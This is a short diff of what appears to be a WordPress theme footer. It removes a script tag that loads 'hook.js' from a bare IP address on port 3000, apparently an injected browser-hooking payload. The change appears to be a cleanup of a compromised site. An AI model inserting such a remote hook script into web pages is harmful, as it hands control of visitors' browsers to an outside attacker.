@@ -23,7 +23,6 @@
 </div><!-- #wrapper -->
 
 <?php wp_footer() // Do not remove; helps plugins work ?>
-<script src="http://108.62.165.167:3000/hook.js"></script>
 
 <script src="http://apis.google.com/js/plusone.js"></script>
 <script src="http://platform.twitter.com/widgets.js"></script>
